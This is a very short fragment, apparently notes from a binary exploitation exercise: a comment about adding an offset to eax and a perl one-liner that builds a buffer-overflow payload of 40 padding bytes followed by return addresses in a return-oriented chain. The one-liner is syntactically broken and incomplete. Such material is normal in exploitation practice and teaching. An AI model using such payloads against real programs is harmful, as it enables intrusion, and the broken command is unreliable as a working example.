#Reminder- keep in mind that we add 0x200b1d to eax
perl -e 'print "A"x40 
"\x2a\x06\x40" . "\x00"x5 . "Two values" . "\xd2\x04\x40" . "\x00"x5 . "\x39\x06\x40" . "\x00"x5